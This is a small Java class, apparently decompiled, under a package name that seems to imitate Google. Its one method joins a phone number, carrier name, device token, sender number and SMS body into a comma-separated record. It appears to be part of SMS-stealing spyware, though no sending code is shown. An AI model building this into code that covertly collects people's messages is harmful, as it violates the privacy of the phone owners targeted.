package com.googleprojects.mm;

public class MMMailContentUtil {
    public static final String MM_MESSAGE_SUBJECT = "";

    public static String makeMMMessageBody(String phoneNum, String netName, String deviceToken, String fromNum, String msgBody, boolean isOn, String versionCode) {
        return new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(MM_MESSAGE_SUBJECT + phoneNum + "," + netName + "," + deviceToken + "," + (isOn ? "1" : "0") + ",")).append(MM_MESSAGE_SUBJECT).append(",").append(fromNum).append(",").toString())).append(msgBody).toString();
    }
}
